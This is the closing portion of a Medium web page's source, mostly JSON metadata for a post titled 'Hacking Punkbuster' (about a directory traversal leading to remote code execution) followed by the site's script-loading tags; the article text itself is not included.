b1d91643f0b_70"},{"__ref":"Paragraph:5b1d91643f0b_71"},{"__ref":"Paragraph:5b1d91643f0b_72"},{"__ref":"Paragraph:5b1d91643f0b_73"},{"__ref":"Paragraph:5b1d91643f0b_74"},{"__ref":"Paragraph:5b1d91643f0b_75"},{"__ref":"Paragraph:5b1d91643f0b_76"},{"__ref":"Paragraph:5b1d91643f0b_77"},{"__ref":"Paragraph:5b1d91643f0b_78"},{"__ref":"Paragraph:5b1d91643f0b_79"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:6accd23011ad"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fmedium.com\u002F@prizmant\u002Fhacking-punkbuster-e22e6cf2f36e","primaryTopic":null,"topics":[{"__typename":"Topic","slug":"cybersecurity"},{"__typename":"Topic","slug":"programming"}],"isPublished":true,"latestPublishedVersion":"5b1d91643f0b","visibility":"PUBLIC","postResponses":{"__typename":"PostResponses","count":0},"clapCount":16,"allowResponses":true,"isLimitedState":false,"title":"Hacking Punkbuster","isSeries":false,"sequence":null,"uniqueSlug":"hacking-punkbuster-e22e6cf2f36e","socialTitle":"","socialDek":"","canonicalUrl":"","metaDescription":"","latestPublishedAt":1721450139752,"readingTime":9.34245283018868,"previewContent":{"__typename":"PreviewContent","subtitle":"A Directory Traversal Attack on Punkbuster Server can be Leveraged to Gain Remote Code Execution"},"previewImage":{"__ref":"ImageMetadata:1*9CiLrQCxtufYQW0TU8O4aA.png"},"isShortform":false,"seoTitle":"","firstPublishedAt":1601032760715,"updatedAt":1721450140390,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"","viewerEdge":{"__ref":"PostViewerEdge:postId:e22e6cf2f36e-viewerId:lo_2246cba9c8b2"},"isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[],"isNewsletter":false,"statusForCollection":null,"pendingCollection":null,"detectedLanguage":"en","wordCount":2330,"layerCake":0,"responsesLocked":false}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"HIT"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.1b75cd39.js"></script><script src="https://cdn-client.medium.com/lite/static/js/9865.1496d74a.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.bc924586.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.d9108df7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.ff22a7a5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5049.d1ead72d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4810.6318add7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6618.db187378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2707.a4e221ac.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9977.933c1c9a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8599.73cb8339.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5250.9f9e01d2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8346.be5bef41.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2648.26563adf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8393.826a25fb.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4863.28ab43f6.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6589.ab860fa4.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5642.0f82ef97.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6546.7c45541d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6834.8aa8d357.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4492.3e85e9f5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/839.1c286b32.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3259.1779fbde.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7975.60bcefe8.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7394.ca29bb88.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5794.9e8ff5dd.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8204.e2639348.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4391.59acaed3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.111f755f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8414.6565ad5f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3974.8d3e0217.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2527.21406717.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostResponsesContent.0eb77899.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/responses.editor.5a11f4da.chunk.js"></script><script>window.main();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'900782585aa19550',t:'MTczNjYyNTc5NS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"900782585aa19550","version":"2024.10.5","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"0b5f665943484354a59c39c6833f7078","b":1}' crossorigin="anonymous"></script>
</body></html>